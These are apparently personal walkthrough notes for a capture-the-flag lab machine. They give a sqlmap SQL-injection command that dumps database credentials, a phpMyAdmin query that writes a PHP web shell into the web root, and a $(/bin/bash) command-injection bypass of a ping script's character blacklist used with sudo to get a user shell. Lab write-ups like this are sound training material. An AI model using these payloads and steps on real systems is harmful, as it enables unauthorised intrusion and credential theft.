Webpage on 80 is vulnerable to SQL injection in the ?cod= parameter 

Nikto finds /phpmyadmin page for login

Command:
        sqlmap -u http://10.10.10.143/room.php?cod=1 --dbms MySQL -a 
Dumps the db, including creds: DBadmin : imissyou

This can be used to log into phpmyadmin

Using â€œSQL" tab at top, enter: 
        SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/backdoor.php";
And execute

This places backdoor php file in web directory

Python script on machine is able to ping targets, but bandit identifies a vulnerability in its code in allowing input to be executed

Script has a blacklist of: &  ;  -  `  ||  | 

Trying to either a) escape/encode operator, or b) find one that the program will accept. 

Python script can be bypassed by inputting $(COMMAND) into the ping prompt. 

Command: sudo -u pepper /var/www/Admin-Utilities/simpler.py -p 
                $(/bin/bash)
                
Shell granted as pepper 

Pepper can execute /bin/systemctl with the SUID bit.
